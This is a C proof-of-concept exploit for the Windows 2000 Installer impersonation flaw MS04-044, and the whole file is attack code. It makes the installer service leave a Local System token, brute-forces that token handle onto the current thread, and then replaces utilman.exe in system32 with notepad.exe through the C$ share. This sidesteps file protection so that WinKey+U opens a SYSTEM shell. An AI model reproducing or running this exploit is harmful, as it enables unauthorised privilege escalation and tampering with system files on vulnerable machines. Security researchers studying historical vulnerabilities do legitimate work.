// Impersonation POC Exploit
// Works on Win2k all service packs
// by Cesar Cerrudo (sqlsec>at<yahoo>dot<com)
// http://www.microsoft.com/technet/security/bulletin/MS04-044.mspx
// (*1*) If it doesn't work try again and research yourself. Don't ask me.

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"

#define INFO_BUFFER_SIZE MAX_COMPUTERNAME_LENGTH + 1
#define PATH_SIZE INFO_BUFFER_SIZE + MAX_PATH + 4
typedef UINT (WINAPI* PFnMsiInstallProduct)(LPCSTR szPackagePath, LPCSTR szCommandLine);

int main(int argc, char* argv[])
{
        HANDLE hToken,hThread;
        HMODULE hMsi = 0;
        CHAR infoBuf[INFO_BUFFER_SIZE];
        DWORD bufCharCount = INFO_BUFFER_SIZE;
        CHAR file1[PATH_SIZE]="\\\\";
        CHAR file2[PATH_SIZE]="\\\\";
        CHAR file3[PATH_SIZE]="\\\\";
        
        //Get name of the computer.
        GetComputerName(infoBuf, &bufCharCount);
        
        hThread=GetCurrentThread();
        hMsi = LoadLibrary("msi.dll");

        //Invoke windows installer service in order to steal a Local System account identity token.
        //Curious? some internal LPC magic here, see *1*
        PFnMsiInstallProduct MsiInstallProduct = 0;
        MsiInstallProduct = (PFnMsiInstallProduct)GetProcAddress(hMsi, "MsiInstallProductA");
        MsiInstallProduct("","");
   
        //Get Local System account identity token and set it to current thread
        hToken=(void*)0x1;
        while(SetThreadToken(&hThread,hToken)==NULL){
                hToken=(void*)((int)hToken+1);
        }

        strcat(file1,infoBuf);
        strcat(file1,"\\C$\\winnt\\system32\\utilman.exe");
    
        strcat(file2,infoBuf);
        strcat(file2,"\\C$\\winnt\\system32\\utilmanback.exe");
    
        strcat(file3,infoBuf);
        strcat(file3,"\\C$\\winnt\\system32\\notepad.exe");

        //Replace Utility Manager with Notepad impersonating Local System account
        //BTW: fuck Windows file protection :)
        if(!CopyFile(file1,file2, TRUE))
                printf("CopyFile() failed: %d\n", GetLastError());
        else
                if(!CopyFile(file3,file1, FALSE))
                        printf("CopyFile() failed: %d\n", GetLastError());
                else {
                        printf("\nPress WinKey+U to run Notepad as Local System\n");
                        printf("Remember to restore original utilman.exe from utilmanback.exe\n");
                }

        Sleep(5000);
        return 0;
} 
